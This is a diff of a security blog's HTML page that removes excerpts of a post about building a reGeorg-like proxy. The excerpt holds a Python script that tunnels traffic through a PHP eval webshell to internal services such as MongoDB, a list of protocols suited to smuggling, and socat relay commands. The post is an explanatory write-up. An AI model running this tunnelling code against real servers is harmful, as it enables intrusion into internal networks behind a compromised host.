-    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content
-    print data2
-    print &quot;sending data&quot;
-    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
-<p>绑定本机的8889端口，然后mongo直接连,<code>mongo --port 8889</code>,如果想观察之间的流量可以这样做:</p>
- <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;监听8889
-socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;流量肉眼可以看
-mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的<code>子集</code>，因为如果要访问端口之类的就需要改脚本了。</p>
-<p>看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:</p>
-	
-
-	</div>
-  <a type="button" href="/2019/10/23/php-eval-proxy.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>背景: linux，php环境下的reGeorg不可用。<br>目标: 分析reGeorg的原理尝试改一下<br>结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis</p>
-<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
-  HTTP based protocol:
-    Elastic, CouchDB, Mongodb, Docker
-
-  Text-based protocol:
-    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h3 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h3><p>这个脚本是个残的:</p>
-<pre class="line-numbers language-none"><code class="language-none">#coding: utf-8
-import socket
-import binascii
-import requests
-
-
-headers &#x3D; &#123;
-&quot;Host&quot;: &quot;&quot;,
-&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
-&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,
-&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,
-&quot;Connection&quot;: &quot;close&quot;
-&#125;
-
-url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;
-s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind((&quot;127.0.0.1&quot;,8889))
-s.listen(5)
-sock, addr_info &#x3D; s.accept()
-
-while True:
-    print &#39;Connect by &#39;, addr_info
-    data &#x3D; sock.recv(102400)
-    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;
-    print payload
-    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content
-    print data2
-    print &quot;sending data&quot;
-    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
-<p>绑定本机的8889端口，然后mongo直接连,<code>mongo --port 8889</code>,如果想观察之间的流量可以这样做:</p>
- <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;监听8889
-socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;流量肉眼可以看
-mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的<code>子集</code>，因为如果要访问端口之类的就需要改脚本了。</p>
-<p>看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:</p>
-	
-	</div>
-  <a type="button" href="/2019/10/23/php-eval-proxy.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -672,6 +654,8 @@ mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-nu
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
+			<li><a href="/categories/Java/">Java<span>3</span></a></li>
+		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
@@ -697,23 +681,23 @@ mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-nu
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
+      </li>
+    
+      <li>
+        <a href="/2022/03/22/java-reflection-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(2)-反射执行系统命令</a>
+      </li>
+    
+      <li>
+        <a href="/2022/03/22/java-reflection.html" ><i class="fa fa-file-o"></i>Java安全笔记(1)-反射机制</a>
+      </li>
+    
+      <li>
         <a href="/2022/03/21/jndi-exec-by-mvel.html" ><i class="fa fa-file-o"></i>JNDI Bypass - MVEL</a>
       </li>
     
       <li>
         <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
-      </li>
-    
-      <li>
-        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
-      </li>
-    
-      <li>
-        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
       </li>
     
   </ul>
